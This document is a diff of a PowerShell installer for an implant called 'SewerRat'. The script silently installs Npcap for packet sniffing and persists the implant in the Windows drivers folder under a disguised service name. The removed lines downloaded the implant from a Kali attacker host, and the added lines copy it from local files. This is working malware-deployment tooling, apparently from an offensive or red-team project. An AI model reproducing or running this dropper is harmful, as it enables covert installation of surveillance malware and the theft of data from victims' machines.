@@ -3,35 +3,29 @@
 # REQUIRES: Administrator Privileges
 # ============================================================================
 
-param (
-    [string]$KaliIP = "192.168.1.223", # Change to your Kali IP or pass as -KaliIP "x.x.x.x"
-    [string]$KaliPort = "80"
-)
-
 # Elevate privileges if not running as Admin
 if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Write-Warning "[-] This script requires Administrator privileges. Please run as Administrator."
     exit
 }
 
-$ImplantURL = "http://${KaliIP}:${KaliPort}/dist/SewerRat.exe"
+$ScriptDir = $PSScriptRoot
+if ([string]::IsNullOrEmpty($ScriptDir)) { $ScriptDir = "." }
+
+$LocalImplant = Join-Path $ScriptDir "SewerRat.exe"
 $DestPath = "C:\Windows\System32\drivers\SewerRat.exe"
-$NpcapexeURL = "http://${KaliIP}:${KaliPort}/npcap-1.87.exe"
-$DestPathNpcap = "C:\Windows\Temp\npcap-1.87.exe"
+$LocalNpcap = Join-Path $ScriptDir "npcap-1.87.exe"
 $ServiceName = "Win32NetworkBuffer"
 
-Write-Host "[*] Downloading Npcap installer from $NpcapexeURL..."
-try {
-    Invoke-WebRequest -Uri $NpcapexeURL -OutFile $DestPathNpcap -UseBasicParsing
-    Write-Host "[+] Download successful: $DestPathNpcap"
-} catch {
-    Write-Host "[-] Download failed: $_"
+Write-Host "[*] Checking for Npcap installer at $LocalNpcap..."
+if (-Not (Test-Path $LocalNpcap)) {
+    Write-Host "[-] local Npcap installer not found! Make sure to transfer it."
     exit
 }
 
 Write-Host "[*] Installing Npcap silently (Required for Layer 2 Packet Sniffing)..."
 try {
-    $process = Start-Process -FilePath $DestPathNpcap -ArgumentList "/S", "/winpcap_mode=yes", "/admin_only=no" -Wait -PassThru
+    $process = Start-Process -FilePath $LocalNpcap -ArgumentList "/S", "/winpcap_mode=yes", "/admin_only=no" -Wait -PassThru
     if ($process.ExitCode -eq 0) {
         Write-Host "[+] Npcap installed successfully."
     } else {
@@ -41,15 +35,18 @@ try {
     Write-Host "[-] Failed to execute Npcap installer: $_"
 }
 
-Write-Host "[*] Cleaning up Npcap installer..."
-Remove-Item -Path $DestPathNpcap -Force -ErrorAction SilentlyContinue
+Write-Host "[*] Checking for SewerRat implant at $LocalImplant..."
+if (-Not (Test-Path $LocalImplant)) {
+    Write-Host "[-] local SewerRat implant not found! Make sure to transfer it."
+    exit
+}
 
-Write-Host "[*] Downloading SewerRat implant from $ImplantURL..."
+Write-Host "[*] Persisting SewerRat implant to $DestPath..."
 try {
-    Invoke-WebRequest -Uri $ImplantURL -OutFile $DestPath -UseBasicParsing
-    Write-Host "[+] Download successful: $DestPath"
+    Copy-Item -Path $LocalImplant -Destination $DestPath -Force
+    Write-Host "[+] Implant copied successfully: $DestPath"
 } catch {
-    Write-Host "[-] Download failed: $_"
+    Write-Host "[-] Failed to copy implant: $_"
     exit
 }
 
